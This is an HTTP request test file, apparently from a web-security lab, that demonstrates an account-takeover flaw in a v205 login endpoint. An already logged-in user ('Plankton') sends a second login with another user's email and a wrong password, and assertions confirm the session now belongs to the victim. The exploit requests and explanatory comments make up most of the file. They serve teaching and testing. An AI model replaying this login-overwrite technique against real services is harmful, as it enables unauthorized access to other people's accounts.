# @import ../common/setup.http
@base = {{base_host}}/v205

### Step 1: Plankton logs in normally
# @name login
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

### Exploit: The "Body Snatcher"
# Plankton is already logged in (Cookie).
# He sends a Login Request for SpongeBob with a garbage password.
# The Authenticator sees the valid Cookie and returns "True" (Success).
# The Handler assumes the JSON credentials were valid and overwrites the session email with SpongeBob's.
# @name exploit
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "spongebob@bikinibottom.sea",
    "password": "does_not_matter"
}

# Verification: Plankton's session now belongs to SpongeBob.
?? status == 200
GET {{base}}/account/info
?? status == 200
?? body.email == "spongebob@bikinibottom.sea"
